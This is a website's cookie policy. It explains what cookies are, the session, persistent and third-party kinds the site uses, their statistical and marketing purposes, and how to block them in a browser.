* 1. **About cookies** - Cookies are small data files, especially text files, which are stored by a server on your computer. With these files, your device will be recognized and, in consequence, the way a given website is presented will be adjusted to your personal preferences. Cookies usually contain the name of the website from which they originate, information on how long they have been stored on the device and a unique number.
* 2. **Which type of cookies do we use** - Session cookies – temporary files which are stored on your device until you log out from a given website or close the Internet browser. Persistent cookies – permanent files that remain on your device for a fixed period (specified in the parameters of the file) or until they are deleted manually. Third-party cookies – files that adjust the way a given website is presented to your personal preferences.
* 3. **Why do we use cookies?** - Cookies are used for the purpose of statistics, marketing and in order to adjust the contents of websites to the user's personal preferences. Cookies store information about geolocation, the visitor's language and random data about session identifiers. With the collected data, we are able to understand how exactly the visitor uses websites and, consequently, to improve their structure and content. The information received helps us to prepare statistics related to the number of new and regular users as well as enables us to analyze which pages are visited.
* 4. **How to use and how to disable cookies** - You can change the settings of your Internet browser at any time, so that it would block cookies or inform you when they are being sent. However, please note that if you do not accept the cookie policy, you may encounter some problems while using the website. The software used for searching websites accepts the cookies by default. The settings of an Internet browser can be changed, so that it would block cookies or inform the user each time when cookies are being sent onto his/her device. For more information on how to disable automatic saving of cookies, please check the settings of your Internet browser (the software used for searching Internet websites).

This page uses cookies. Click here to learn more. Accept Reject


